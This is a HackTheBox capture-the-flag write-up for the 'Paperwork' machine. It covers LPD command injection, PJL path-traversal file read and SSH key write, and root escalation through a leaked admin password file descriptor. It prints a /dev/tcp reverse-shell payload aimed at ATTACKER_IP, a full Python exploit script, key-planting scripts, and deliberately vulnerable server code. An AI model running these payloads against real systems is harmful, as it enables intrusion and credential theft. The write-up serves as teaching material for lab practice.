---
title: "HackTheBox Write-up: Paperwork"
date: 2026-07-16 
categories: [Write-ups, HackTheBox]
---

# HackTheBox — Paperwork (Season 11)

![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Rating: 4.1](https://img.shields.io/badge/Rating-4.1-yellow)

<img width="1236" height="488" alt="Screenshot 2026-07-16 005659" src="https://github.com/user-attachments/assets/722c6d43-3b5a-4e77-978d-feeded338627" />


## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  - [Nmap Scan](#nmap-scan)
  - [Web Enumeration (Port 80)](#web-enumeration-port-80)
- [Foothold — LPD Command Injection](#foothold--lpd-command-injection)
  - [Source Code Analysis](#source-code-analysis)
  - [Exploit Development](#exploit-development)
  - [Getting a Shell as `lp`](#getting-a-shell-as-lp)
- [Lateral Movement — PJL Exploitation](#lateral-movement--pjl-exploitation)
  - [Internal Enumeration](#internal-enumeration)
  - [JetDirect PJL File Read (User Flag)](#jetdirect-pjl-file-read-user-flag)
  - [PJL FSDOWNLOAD — SSH Key Write](#pjl-fsdownload--ssh-key-write)
- [Privilege Escalation — SCM_RIGHTS fd Leaking](#privilege-escalation--scm_rights-fd-leaking)
  - [Paperwork Daemon Analysis](#paperwork-daemon-analysis)
  - [Triggering Lockdown & Receiving File Descriptors](#triggering-lockdown--receiving-file-descriptors)
  - [Root Shell](#root-shell)
- [Summary](#summary)

---

## Overview

**Paperwork** is an Easy-rated Linux machine from HackTheBox Season 11. It simulates a corporate document archiving system that runs a custom LPD (Line Printer Daemon) service vulnerable to **OS command injection**. Lateral movement is achieved by exploiting a **JetDirect PJL** printer service with path traversal to read/write files as `archivist`. Finally, privilege escalation leverages a root-owned daemon that leaks sensitive file descriptors via **Unix socket SCM_RIGHTS** passing, revealing the admin password.

### Attack Chain

```
LPD Command Injection → Shell (lp)
        ↓
PJL Path Traversal → Read user.txt + Write SSH key → Shell (archivist)
        ↓
SCM_RIGHTS FD Leak → Admin Password → Root
```

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.13.98
```

```
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
1515/tcp open  ifor-protocol?
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
```

**Key observations:**

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | Standard OpenSSH |
| 80 | HTTP (nginx) | Redirects to `http://paperwork.htb/` |
| **1515** | **Custom LPD** | Returns "Archive_Printer is ready and printing." |

> Add `10.129.13.98 paperwork.htb` to `/etc/hosts` before proceeding.

### Web Enumeration (Port 80)

Browsing to `http://paperwork.htb/` reveals a corporate **"Intake Portal"** for a Document Archiving Service.

<img width="1917" height="822" alt="Screenshot 2026-07-15 235755" src="https://github.com/user-attachments/assets/0e3dac25-6d88-4404-8946-51a4d52d5d6a" />

<img width="1917" height="331" alt="Screenshot 2026-07-15 235822" src="https://github.com/user-attachments/assets/efb76e61-8a99-4c42-ba98-c766b42087a2" />

Key information from the page:

- **Protocol**: `Compliance Level: RFC 1179` — This is the **Line Printer Daemon** protocol
- **Target Queue**: `archive_intake`
- **Internal Processor**: Downloadable file at `/download/archive` → `paperwork-archive-v1.02.zip`
- **Maintenance Advisory**: Backend spooler `PRN-ARCHIVE-01` management console is offline

```bash
wget http://paperwork.htb/download/archive -O paperwork-archive-v1.02.zip
unzip paperwork-archive-v1.02.zip
```

<img width="240" height="77" alt="Screenshot 2026-07-15 235840" src="https://github.com/user-attachments/assets/0bfbecbf-c804-4e89-ba71-f20185ca9075" />

This gives us `server.py` — the source code of the LPD service running on port 1515.

---

## Foothold — LPD Command Injection

### Source Code Analysis

Examining `server.py` reveals a critical **OS Command Injection** vulnerability:

```python
def handle_print_job(self, data):
    queue = data[1:].decode().strip()

    if queue not in VALID_QUEUE:
        self.sock.send(b'\x01')
        return

    self.sock.send(b'\x00')  # ACK

    while True:
        chunk = self.sock.recv(1024)
        if not chunk: break

        subcommand = chunk[0]
        self.sock.send(b'\x00')  # ACK

        if subcommand == 2:  # Control File
            parts = chunk[1:].decode(errors='ignore').split()
            size = int(parts[0])

            content = b""
            while len(content) < size:
                content += self.sock.recv(size - len(content) + 1)

            decoded_content = content.decode(errors='ignore')

            job_name = "Unknown"
            for line in decoded_content.split('\n'):
                line = line.strip()
                if line.startswith('J'):
                    job_name = line[1:]  # ← User-controlled, NO sanitization
                    break

            # 🔴 COMMAND INJECTION — job_name injected directly into shell
            subprocess.Popen(
                f"echo 'Archive: {job_name}' >> /tmp/archive.log",
                shell=True
            )
```

**The vulnerability**: The `J` line (job name) from the LPD control file is extracted without any sanitization and passed directly into `subprocess.Popen()` with `shell=True`. This allows arbitrary command execution.

**Injection payload:**

```
J' ; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' #
```

**Result when executed by the server:**

```bash
echo 'Archive: ' ; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' # ' >> /tmp/archive.log
#     ↑ closes quote  ↑ separator    ↑ reverse shell                     ↑ comments out rest
```

### Exploit Development

```python
#!/usr/bin/env python3
"""
Paperwork HTB — LPD Command Injection Exploit
Exploits unsanitized job_name in subprocess.Popen(shell=True)
"""

import socket
import sys
import time

def exploit(target, target_port, lhost, lport):
    # Reverse shell payload via J-line injection
    payload = f"' ; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' #"

    # Build LPD control file (RFC 1179 format)
    control_file = f"Hlocalhost\nProot\nJ{payload}\n"
    control_bytes = control_file.encode()
    control_size = len(control_bytes)

    print(f"[*] Target: {target}:{target_port}")
    print(f"[*] Reverse shell: {lhost}:{lport}")
    print(f"[*] Control file size: {control_size} bytes")

    # Step 1: Connect to LPD service
    print("[1] Connecting to LPD service...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((target, target_port))
    print("    [+] Connected!")

    # Step 2: Send receive-job command for queue "archive_intake"
    print("[2] Sending print job request for queue 'archive_intake'...")
    s.send(b'\x02archive_intake\n')
    time.sleep(1)

    # Step 3: Send control file sub-command
    subcmd = f"\x02{control_size} cfA001localhost\n".encode()
    print(f"[3] Sending control file sub-command...")
    s.send(subcmd)

    # Receive ACK
    ack = s.recv(1)
    if ack == b'\x00':
        print("    [+] ACK received!")

    # Step 4: Send control file with malicious J-line
    print("[4] Sending malicious control file...")
    s.send(control_bytes)
    time.sleep(2)

    print("\n[+] Payload delivered! Check your netcat listener.")
    s.close()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <YOUR_TUN0_IP> <LISTEN_PORT>")
        sys.exit(1)

    exploit("10.129.13.98", 1515, sys.argv[1], sys.argv[2])
```

### Getting a Shell as `lp`

**Terminal 1 — Listener:**

```bash
nc -nlvp 4444
```

**Terminal 2 — Exploit:**

```bash
python3 paperwork_exploit.py <TUN0_IP> 4444
```

```
[1] Connecting to LPD service...
    [+] Connected!
[2] Sending print job request for queue 'archive_intake'...
[3] Sending control file sub-command...
    [+] ACK received!
[4] Sending malicious control file...

[+] Payload delivered! Check your netcat listener.
```

**Listener catches reverse shell:**

```
connect to [10.10.14.242] from (UNKNOWN) [10.129.13.98] 54558
bash: cannot set terminal process group (994): Inappropriate ioctl for device
lp@paperwork:/opt/LPDServer$ id
uid=7(lp) gid=7(lp) groups=7(lp)
```

We have a shell as the `lp` user.

---

## Lateral Movement — PJL Exploitation

### Internal Enumeration

Running `ps aux` reveals critical internal services:

```
archivist  992  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
root      1497  /usr/bin/python3 /usr/bin/paperwork-daemon
```

Checking internal ports:

```bash
ss -tlnp
```

```
LISTEN  127.0.0.1:9100   # JetDirect (archivist) — NOT exposed externally
LISTEN  127.0.0.1:1337   # Internal service
LISTEN  0.0.0.0:1515     # LPD server (lp) — our entry point
```

**Key finding**: A **JetDirect PJL printer service** is running on `127.0.0.1:9100` as user `archivist`, serving files from `/home/archivist/printer/`.

### JetDirect PJL File Read (User Flag)

Since `nc` isn't installed, we use Python to interact with the JetDirect service via PJL (Printer Job Language) commands:

```bash
cat > /tmp/p.py << 'EOF'
import socket, time
def pjl(cmd):
    s = socket.socket()
    s.settimeout(5)
    s.connect(('127.0.0.1', 9100))
    s.send(('\x1b%-12345X' + cmd + '\r\n').encode())
    time.sleep(1)
    try:
        r = s.recv(8192).decode(errors='ignore')
        print('CMD: ' + cmd)
        print('RESP: ' + r)
    except Exception as e:
        print('CMD: ' + cmd + ' ERR: ' + str(e))
    print('---')
    s.close()

pjl('@PJL INFO ID')
pjl('@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=999')
pjl('@PJL FSDIRLIST NAME="0:/../" ENTRY=1 COUNT=999')
pjl('@PJL FSUPLOAD NAME="0:/../user.txt" OFFSET=0 SIZE=1024')
EOF
python3 /tmp/p.py
```

**Results:**

```
CMD: @PJL FSDIRLIST NAME="0:/../" ENTRY=1 COUNT=999
RESP: . TYPE=DIR
.. TYPE=DIR
.ssh TYPE=DIR SIZE=4096
user.txt TYPE=FILE SIZE=33
printer TYPE=DIR SIZE=4096
...
---
CMD: @PJL FSUPLOAD NAME="0:/../user.txt" OFFSET=0 SIZE=1024
RESP: @PJL FSUPLOAD NAME="0:/../user.txt" SIZE=33
37db42e3f8611c8e13481a408665ecb2
```

<img width="640" height="208" alt="Screenshot 2026-07-16 004349" src="https://github.com/user-attachments/assets/39798b36-e25a-4253-89cb-582a3f9e8670" />

**Path traversal** works because `jetdirect.py`'s `_translate()` method doesn't validate the resolved path stays within the root directory:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
    # No check if result is still under self._root!
```

- `0:/../user.txt` → `/home/archivist/printer/../user.txt` → `/home/archivist/user.txt`

> 🏁 **User Flag**: `37db42e3f8611c8e13481a408665ecb2`

### PJL FSDOWNLOAD — SSH Key Write

Reading the `jetdirect.py` source via PJL FSUPLOAD confirms **FSDOWNLOAD** (write) is also supported. We use this to write an SSH public key to archivist's `authorized_keys`:

```bash
# Generate SSH key pair
ssh-keygen -t ed25519 -f /tmp/ak -N "" -q

# Write public key via PJL FSDOWNLOAD
cat > /tmp/p3.py << 'EOF'
import socket, time

with open('/tmp/ak.pub', 'r') as f:
    pubkey = f.read().strip()

s = socket.socket()
s.settimeout(5)
s.connect(('127.0.0.1', 9100))

data = pubkey.encode() + b'\n'
cmd = '\x1b%-12345X@PJL FSDOWNLOAD FORMAT:BINARY NAME="0:/../.ssh/authorized_keys" SIZE=' + str(len(data)) + '\r\n'
s.send(cmd.encode())
time.sleep(0.5)
s.send(data)
time.sleep(1)
try:
    r = s.recv(4096).decode(errors='ignore')
    print('RESP: ' + r)
except:
    pass
s.close()
EOF
python3 /tmp/p3.py
```

**SSH in as archivist:**

```bash
ssh -i /tmp/ak -o StrictHostKeyChecking=no archivist@127.0.0.1
```

```
archivist@paperwork:~$ id
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
```

---

## Privilege Escalation — SCM_RIGHTS fd Leaking

### Paperwork Daemon Analysis

The `paperwork-daemon` runs as **root** and manages a Unix socket at `/run/paperwork/mgmt.sock`:

```python
# Key parts of /usr/bin/paperwork-daemon

# Opens admin config at startup — file descriptor kept open
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def scan_for_malice():
    """Checks if commands.log contains PJL filesystem commands"""
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    """Sends file descriptors via SCM_RIGHTS — including admin_fd!"""
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
    #                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    #                     Leaks admin_fd to whoever connects!

# Socket permissions: owner=root, group=1000 (archivist)
os.chmod(socket_path, 0o660)
os.chown(socket_path, 0, 1000)
```

**The vulnerability**: When "malicious" PJL commands (FSQUERY/FSUPLOAD/FSDOWNLOAD) are detected in `commands.log`, the daemon sends **file descriptors** via `SCM_RIGHTS` to the connecting client — including `admin_fd`, which points to `/etc/paperwork/admin_pins.conf` containing the admin password.

Since our PJL probing already wrote FSUPLOAD/FSDOWNLOAD to `commands.log`, the malice check will trigger automatically.

### Triggering Lockdown & Receiving File Descriptors

As `archivist`, we connect to the Unix socket and receive the leaked file descriptors:

```bash
cat > /tmp/p4.py << 'EOF'
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/paperwork/mgmt.sock')

# Receive message with SCM_RIGHTS ancillary data
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * 4))
print('MSG:', msg.decode(errors='ignore'))

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds = array.array('i')
        fds.frombytes(cmsg_data)
        for fd in fds:
            try:
                data = os.read(fd, 4096)
                print(f'FD {fd}: {data.decode(errors="ignore")}')
            except Exception as e:
                print(f'FD {fd} err: {e}')
s.close()
EOF
python3 /tmp/p4.py
```

**Output:**

```
MSG: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
FD 4: [commands.log contents...]
FD 5: ADMIN_PASSWORD=ApparelMortuaryCedar22
```

### Root Shell

```bash
archivist@paperwork:~$ su root
Password: ApparelMortuaryCedar22

root@paperwork:~# whoami
root

root@paperwork:~# cat /root/root.txt
```

> 🏁 **Root Flag**: obtained ✅

<img width="617" height="247" alt="Screenshot 2026-07-16 005716" src="https://github.com/user-attachments/assets/30078ca8-6bfc-4e32-b602-97d5fc3b0ae9" />

---

## Summary

| Step | Technique | From → To |
|------|-----------|-----------|
| **Foothold** | OS Command Injection in custom LPD service (RFC 1179) — unsanitized `J`-line in `subprocess.Popen(shell=True)` | Attacker → `lp` |
| **User Flag** | PJL `FSUPLOAD` with path traversal on internal JetDirect service (port 9100) — read `0:/../user.txt` | `lp` → read as `archivist` |
| **Lateral Move** | PJL `FSDOWNLOAD` with path traversal — write SSH public key to `archivist`'s `authorized_keys` | `lp` → `archivist` |
| **Privesc** | Unix socket `SCM_RIGHTS` file descriptor leak from root-owned `paperwork-daemon` — admin password exposed via `admin_fd` | `archivist` → `root` |

### Key Takeaways

1. **Never use `shell=True` with user input** — The LPD server's use of `subprocess.Popen()` with unsanitized input is a textbook command injection.

2. **Validate resolved paths** — The JetDirect `_translate()` method uses `os.path.normpath()` but never checks if the resolved path remains within the intended root directory, enabling path traversal.

3. **SCM_RIGHTS is powerful and dangerous** — Passing file descriptors over Unix sockets can unintentionally leak access to sensitive files. The `paperwork-daemon` sends `admin_fd` (pointing to the admin password file) to any `archivist`-group user who connects.

4. **Defense in depth matters** — Each service ran as a different user (`lp`, `archivist`, `root`), but the chain of vulnerabilities allowed full escalation from external access to root.

---

*Writeup by phat(deniedp4kg) — HackTheBox Season 11*
